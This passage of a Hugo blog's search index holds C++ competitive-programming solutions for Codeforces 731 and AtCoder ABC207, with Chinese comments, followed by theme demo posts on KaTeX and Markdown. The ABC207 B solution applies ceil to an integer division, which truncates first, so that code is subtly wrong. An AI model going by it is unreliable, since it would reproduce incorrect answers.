(i % prime[j] == 0) break; } } } bool cmp(PII a, PII b) { if (a.first != b.first) return a.first \u0026gt; b.first; else return a.second \u0026lt; b.second; } int main() { get_prime(1e6);//筛一下质数 int t; scanf(\u0026#34;%d\u0026#34;, \u0026amp;t); while (t--) { map\u0026lt;int, int\u0026gt; mp; vector\u0026lt;PII\u0026gt; vec; int n, m = 0, g = 0; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); bool same = true; for (int i = 1; i \u0026lt;= n; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;num[i]); if (same \u0026amp;\u0026amp; i \u0026gt; 1 \u0026amp;\u0026amp; num[i] != num[i - 1]) same = false; if (!g) g = num[i]; else g = gcd(g, num[i]); m = max(m, num[i]); int now = num[i];//对每一个数进行质因数分解 for (int j = 0; j \u0026lt;= 1e3 \u0026amp;\u0026amp; prime[j] \u0026lt;= now; j++) { if (now % prime[j] == 0) { mp[prime[j]]++; while (now % prime[j] == 0) { now /= prime[j]; } } } if (now != 1) mp[now]++; } if (same) { printf(\u0026#34;0\\n\u0026#34;); continue; } for (auto it : mp) { vec.push_back({it.second, it.first}); } sort(vec.begin(), vec.end(), cmp);//按出现次数对质因数排序 for (int i = 1; i \u0026lt;= n; i++) num[i] /= g; int ans = 1, count_num = 0; for (auto it : vec) { if (count_num++ \u0026gt; 1e3 || it.first \u0026lt;= ans) break; int k = 0, now = 0, head = 0; for (int j = 1; j \u0026lt;= n; j++) { if (num[j] % it.second == 0) k++; else { if (num[1] % it.second == 0 \u0026amp;\u0026amp; !head) head = k; now = max(now, k); k = 0; } } if (k) { now = max(now, k + head); } ans = max(ans, now); } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; endl; } return 0; } ","date":"2021-07-12T00:00:00Z","image":"https://example.com/post/cf731/codeforces.png","permalink":"https://example.com/p/cf731/","title":"CF731"},{"content":"AtCoder Beginner Contest 207 A-Repression 水题\n1 2 3 4 5 6 7 8 9 10 #include \u0026lt;iostream\u0026gt; using namespace std; int main() { int a, b, c; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b \u0026gt;\u0026gt; c; int ans = max(a + b, b + c); ans = max(a + c, ans); cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; endl; return 0; } B-Hydrate 水题，当$ b \\ge C \\times D$时无解； 否则设答案为T $$ D \\geqslant \\frac{A + T \\times B}{C \\times T} \\Rightarrow T \\geqslant \\frac{A}{D \\times C - B} $$ 则输出 $\\left \\lceil \\frac{A}{D \\times C - B} \\right \\rceil $\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include \u0026lt;cmath\u0026gt; #include \u0026lt;iostream\u0026gt; using namespace std; typedef long long ll; int main() { int a, b, c, d; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b \u0026gt;\u0026gt; c \u0026gt;\u0026gt; d; if (b \u0026gt;= c * d) puts(\u0026#34;-1\u0026#34;); else printf(\u0026#34;%lld\\n\u0026#34;, (ll)ceil(a / (d * c - b))); return 0; } C-Many Segments 暴力法, 每两段区间直接进行判断 $O(N ^ {2}) $; 对 4 种区间情况，进行了一点小处理\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 #include \u0026lt;algorithm\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;iostream\u0026gt; #define x first #define y second using namespace std; typedef long long ll; const int M = 2021; typedef pair\u0026lt;int, int\u0026gt; PII; PII num[M]; int t[M]; void f(int op, double \u0026amp;a, double \u0026amp;b) { //处理区间开闭 if (op == 2) b -= 0.1; else if (op == 3) a += 0.1; else if (op == 4) { a += 0.1, b -= 0.1; } } bool cheak(int i, int j) { //判断函数 double a = num[i].x, b = num[i].y, c = num[j].x, d = num[j].y; f(t[i], a, b); f(t[j], c, d); if (a \u0026lt;= c \u0026amp;\u0026amp; b \u0026gt;= c) return true; else if (c \u0026lt;= a \u0026amp;\u0026amp; d \u0026gt;= a) return true; return false; } int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (int i = 1; i \u0026lt;= n; i++) scanf(\u0026#34;%d%d%d\u0026#34;, \u0026amp;t[i], \u0026amp;num[i].x, \u0026amp;num[i].y); int cnt = 0; for (int i = 1; i \u0026lt;= n; i++) { for (int j = i + 1; j \u0026lt;= n; j++) { if (cheak(i, j)) { cnt++; } } } printf(\u0026#34;%d\\n\u0026#34;, cnt); return 0; } 还可以用离散化 + 扫描线法 ${\\large O}(N \\log{N}) $; 预处理区间边界，用 map 实现离散化，再扫描线求出答案；\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 #include \u0026lt;iostream\u0026gt; #include \u0026lt;map\u0026gt; #define x first #define y second using namespace std; typedef long long ll; const int M = 2021; typedef pair\u0026lt;ll, ll\u0026gt; Pll; typedef pair\u0026lt;int, int\u0026gt; PII; Pll num[M]; int t[M]; void f(int op, ll \u0026amp;a, ll \u0026amp;b) { //处理区间边界 a *= 10, b *= 10; if (op == 2) b -= 1; else if (op == 3) a += 1; else if (op == 4) { a += 1; b -= 1; } } int main() { int n, cnt = 0; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); map\u0026lt;ll, PII\u0026gt; mp; for (int i = 1; i \u0026lt;= n; i++) { scanf(\u0026#34;%d%lld%lld\u0026#34;, \u0026amp;t[i], \u0026amp;num[i].x, \u0026amp;num[i].y); f(t[i], num[i].x, num[i].y); mp[num[i].x].x++, mp[num[i].y].y++; //记录线段的始，末 } int last = 0; // 当前“延续”的线段 for (auto i : mp) { cnt += last * i.y.x; //计算新出现的与旧的线段的交叉 cnt += (i.y.x - 1) * (i.y.x) / 2;//计算新线段之间的交叉 last += i.y.x - i.y.y; } printf(\u0026#34;%d\\n\u0026#34;, cnt); return 0; } 思考：如果是三条线段重叠，则每次更新可能是 $$ \\binom{last}{1} \\binom{new}{2} + \\binom{last}{2}\\binom{new}{1} + \\binom{new}{3} $$ 依此类推……\nE - Mod i 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include \u0026lt;algorithm\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;iostream\u0026gt; using namespace std; typedef long long ll; const ll MOD = 1e9 + 7, M = 3030; ll num[M], S[M], dp[M][M], r[M]; int main(){ int N; scanf(\u0026#34;%d\u0026#34;, \u0026amp;N); for (int i = 1; i \u0026lt;= N; i++) scanf(\u0026#34;%lld\u0026#34;, \u0026amp;num[i]); for (int i = 1; i \u0026lt;= N; i++){ S[i] = S[i - 1] + num[i]; } ll ans = 0; dp[0][0] = 1; for (int i = 1; i \u0026lt;= N; i++){ memset(r, 0, sizeof r); for (int j = 0; j \u0026lt;= N; j++){ dp[i][j] = r[S[j] % i]; r[S[j] % i] += dp[i - 1][j]; r[S[j] % i] %= MOD; } ans += dp[i][N]; ans %= MOD; } printf(\u0026#34;%lld\\n\u0026#34;, ans); return 0; } ","date":"2021-07-02T00:00:00Z","permalink":"https://example.com/p/abc207/","title":"ABC207"},{"content":"图片 公式 Mathematical notation in a Hugo project can be enabled by using third party JavaScript libraries.\nIn this example we will be using KaTeX\nCreate a partial under /layouts/partials/math.html Within this partial reference the Auto-render Extension or host these scripts locally. Include the partial in your templates like so: 1 2 3 {{ if or .Params.math .Site.Params.math }} {{ partial \u0026#34;math.html\u0026#34; . }} {{ end }} To enable KaTex globally set the parameter math to true in a project\u0026rsquo;s configuration To enable KaTex on a per page basis include the parameter math: true in content files Note: Use the online reference of Supported TeX Functions\nExamples Block math: $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$\nMathematical notation in a Hugo project can be enabled by using third party JavaScript libraries.\nIn this example we will be using KaTeX\nCreate a partial under /layouts/partials/math.html Within this partial reference the Auto-render Extension or host these scripts locally. Include the partial in your templates like so: 1 2 3 {{ if or .Params.math .Site.Params.math }} {{ partial \u0026#34;math.html\u0026#34; . }} {{ end }} To enable KaTex globally set the parameter math to true in a project\u0026rsquo;s configuration To enable KaTex on a per page basis include the parameter math: true in content files Note: Use the online reference of Supported TeX Functions\nExamples Block math: $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$\n视频链接测试 Hugo ships with several Built-in Shortcodes for rich content, along with a Privacy Config and a set of Simple Shortcodes that enable static and no-JS versions of various social media embeds.\nYouTube Privacy Enhanced Shortcode bilibilibi Shortcode ","date":"2020-09-09T00:00:00Z","image":"https://example.com/p/test-chinese/ICPC_huac24b15fca495a3d437d2bd38e73db2d_4994_120x120_fill_box_smart1_3.png","permalink":"https://example.com/p/test-chinese/","title":"Chinese Test"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating. — Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code A B C D E F Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex. Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus Proin sit amet velit nec enim imperdiet vehicula. Ut bibendum vestibulum quam, eu egestas turpis gravida nec Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien Code Blocks Code block with backticks 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Diff code block 1 2 3 4 5 6 [dependencies.bevy] git = \u0026#34;https://github.com/bevyengine/bevy\u0026#34; rev = \u0026#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13\u0026#34; - features = [\u0026#34;dynamic\u0026#34;] + features = [\u0026#34;jpeg\u0026#34;, \u0026#34;dynamic\u0026#34;] image = \u0026#34;pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg\u0026#34; List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Fruit Apple Orange Banana Dairy Milk Cheese Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nHyperlinked image The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2020-07-19T09:55:02+08:00","image":"https://example.com/p/hello-hugo/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_120x120_fill_q75_box_smart1.jpg","permalink":"https://example.com/p/hello-hugo/","title":"Hello Hugo"}]